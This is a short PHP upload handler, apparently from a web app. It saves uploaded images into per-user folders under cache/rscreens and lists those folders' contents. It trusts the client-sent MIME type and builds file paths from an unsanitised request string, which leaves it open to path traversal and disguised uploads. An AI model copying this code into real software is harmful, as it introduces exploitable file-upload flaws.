<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

if(!empty($Cur['str'])){    $matches = explode('0', $Cur['str'], 2);
	if(!empty($matches[0]) && !empty($matches[1])){
		$prefix = $matches[0];
		$uid = '0' . $matches[1];
	}

	if(!empty($prefix)){		if(isset($_FILES['file'])){			//print_r($_FILES);
			if(!empty($_FILES['file']['name']) && $_FILES['file']['size'] > 0){
				switch($_FILES['file']['type']){					case 'image/png': $ext = '.png'; break;
					case 'image/gif': $ext = '.gif'; break;
					case 'image/jpeg': $ext = '.jpg'; break;
					case 'image/jpg': $ext = '.jpg'; break;
					case 'image/jpg': $ext = '.jpg'; break;
					default:
						print('ext_not');
						exit;
					break;
				}


				$name = mt_rand('111111111', '999999999') . $ext;
				if(!file_exists('cache/rscreens/' . $prefix . $uid)) mkdir('cache/rscreens/' . $prefix . $uid);
				if(move_uploaded_file($_FILES['file']['tmp_name'], 'cache/rscreens/' . $prefix . $uid . '/' . $name)){					print($name);
					exit;
				}else{					print('error');
					exit;
				}
			}else{				exit;
			}
		}else{			if(file_exists('cache/rscreens/' . $Cur['str'])){				$items = scandir('cache/rscreens/' . $Cur['str']);
				unset($items[0], $items[1]);
				$smarty->assign('items', $items);
			}
		}
	}else{		exit;
	}
}else{	exit;
}

?>